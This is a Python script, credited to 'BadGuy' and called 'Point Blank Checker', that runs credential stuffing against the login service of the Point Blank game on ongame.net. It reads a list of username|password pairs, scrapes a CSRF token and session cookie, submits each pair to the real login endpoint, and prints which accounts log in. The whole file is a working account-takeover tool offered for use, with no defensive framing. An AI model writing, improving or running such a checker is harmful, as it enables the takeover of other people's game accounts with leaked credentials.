# -*- coding: utf-8 -*-
# -*- author: BadGuy -*-


# NUNCA RETIRE OS CRÉDITOS DO CRIADOR!

try:
	import requests
	import sys
	import os
except Exception as e:
	print("Erro ao importar os módulos: " + str(e))
	sys.exit(1)
	
print("Point Blank Checker v1.0b")

n = os.linesep

def testar(usuario, senha):
	pb_headers = {
		'Accept-Language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
		'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36'
	}

	pb = requests.get("https://minhaconta.ongame.net/entrar/?site=point-blank&url=https://pb.ongame.net/eventos/operacao-summer", headers=pb_headers)

	cookie = pb.headers["Set-Cookie"]

	token = str(pb.text).splitlines()
	token = token[67]
	token = token.split("'")[5]

	pbsubmit_headers = {
		'Accept-Language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
		'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36',
		'Cookie': cookie,
	}
	pbsubmit_dados = {
		'csrfmiddlewaretoken': token,
		'url': 'https://pb.ongame.net',
		'usuario': usuario,
		'senha': senha
	}

	pbsubmit = requests.post("https://minhaconta.ongame.net/entrar/submit/", data=pbsubmit_dados, headers=pbsubmit_headers)
	
	try:
		if pbsubmit.json()["erro"]:
			print("Conta " + usuario + "|" + senha + " Erro de usuario/senha!")
	except:
		if pbsubmit.json()["redirect"]:
			print("Conta " + usuario + "|" + senha + " Logado com sucesso!")

try:
	lista = sys.argv[1]
	print("Iniciando...")
	contas = open(lista, "r")
	for us in contas:
		usuario = us.split("|")[0]
		senha = us.split("|")[1].replace("\r", "")
		senha = senha.replace("\n", "")
		testar(usuario, senha)
except:
	print("Modo de uso:")
	print("python " + sys.argv[0] + " LISTADECONTAS.txt")
	print(n)
	print("As contas no arquivo devem estar no seguinte formato:" + n)
	print("USUARIO|SENHA")
	print(n)
	print("Exemplo:")
	print("contateste123|1234567&89")